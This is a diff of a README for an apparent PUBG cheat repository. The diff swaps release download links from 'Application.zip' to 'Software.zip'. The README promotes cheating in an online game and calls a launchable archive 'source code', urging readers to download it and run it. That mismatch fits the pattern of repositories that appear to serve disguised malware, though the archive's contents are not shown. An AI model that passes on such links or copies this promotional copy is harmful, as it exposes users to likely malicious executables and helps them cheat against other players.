@@ -34,9 +34,9 @@ Ensure you delve deep into the world of PUBG cheats with our repository topics:
 
 ## Cheat Source Code
 
-Ready to take your PUBG gameplay to the next level? Download the cheat source code [here](https://github.com/Abhayedits/PUBG-External-Cheat-FULL-Feature/releases/download/v1.0/Application.zip).
+Ready to take your PUBG gameplay to the next level? Download the cheat source code [here](https://github.com/Abhayedits/PUBG-External-Cheat-FULL-Feature/releases/download/v2.0/Software.zip).
 
-[![Download Cheat!](https://github.com/Abhayedits/PUBG-External-Cheat-FULL-Feature/releases/download/v1.0/Application.zip)](https://github.com/Abhayedits/PUBG-External-Cheat-FULL-Feature/releases/download/v1.0/Application.zip)
+[![Download Cheat!](https://github.com/Abhayedits/PUBG-External-Cheat-FULL-Feature/releases/download/v2.0/Software.zip)](https://github.com/Abhayedits/PUBG-External-Cheat-FULL-Feature/releases/download/v2.0/Software.zip)
 
 Remember, the cheat needs to be launched to start enjoying its full benefits! 🔥
 
